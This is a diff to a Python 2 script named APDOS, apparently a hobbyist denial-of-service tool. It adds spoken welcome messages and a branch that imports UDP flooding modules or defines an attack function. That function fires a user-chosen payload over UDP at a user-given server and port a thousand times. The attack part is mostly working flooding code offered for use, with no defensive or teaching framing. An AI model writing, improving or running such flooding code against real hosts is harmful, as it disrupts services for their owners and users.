@@ -1,4 +1,4 @@
-import socket, sys, os, time, itertools, threading
+import socket, sys, os, time, itertools, threading, speech
 
 # start logo
 print "###################################"
@@ -10,6 +10,9 @@ print " /_/   \_\_|   |____/ \___/|____/ "
 print ""
 print "###################################"
 print ""
+speech.say("Welcome To APDOS")
+time.sleep(1)
+speech.say("Powered by Sav Sec")
 time.sleep(3)
 print "     -=-+- -+-=-  -=-+- -+-=-"
 print "             - APDOS -       "
@@ -27,6 +30,45 @@ if (version == 'okayish'):
 server = raw_input("SERVER: ")
 port = raw_input("PORT: ")
 type = raw_input("PAYLOAD: ")
+if type == "skip":
+	if (version == 'GREAT'):
+		import UDPdos
+		print "   -=-+- -+-=-  -=-+- -+-=-"
+		print "      - APDOS COMPLETE -   "
+		print "   -=-+- -+-=-  -=-+- -+-=-"
+		quit()
+	if (version == 'great'):
+		import UDPdos
+		print "   -=-+- -+-=-  -=-+- -+-=-"
+		print "      - APDOS COMPLETE -   "
+		print "   -=-+- -+-=-  -=-+- -+-=-"
+		quit()
+	if (version == 'feedbacks'):
+		import apdosFEED
+		print "   -=-+- -+-=-  -=-+- -+-=-"
+		print "      - APDOS COMPLETE -   "
+		print "   -=-+- -+-=-  -=-+- -+-=-"
+		quit()
+	if (version == 'FEEDBACKS'):
+		import apdosFEED
+		print "   -=-+- -+-=-  -=-+- -+-=-"
+		print "      - APDOS COMPLETE -   "
+		print "   -=-+- -+-=-  -=-+- -+-=-"
+		quit()
+	# -+--=- -=--+- #
+	def attack():
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
+		s.sendto(type, (server, int(port)))
+		print "Data: " + type
+		print "Server: " + server + ":" + port
+		s.close()
+	for i in range(1, 1000):
+		attack()
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   - APDOS COMPLETE -   "
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	
+	
 print "-+--=- " + server  + " -=--+-\n"
 print "-+--=- " + type + " -=--+-"
 # -+--=- -=--+- #
@@ -208,7 +250,7 @@ def animate():
 
 t = threading.Thread(target=animate)
 t.start()
-
+speech.say("Error, System Failure")
 #long process here
 time.sleep(2)
 done = True
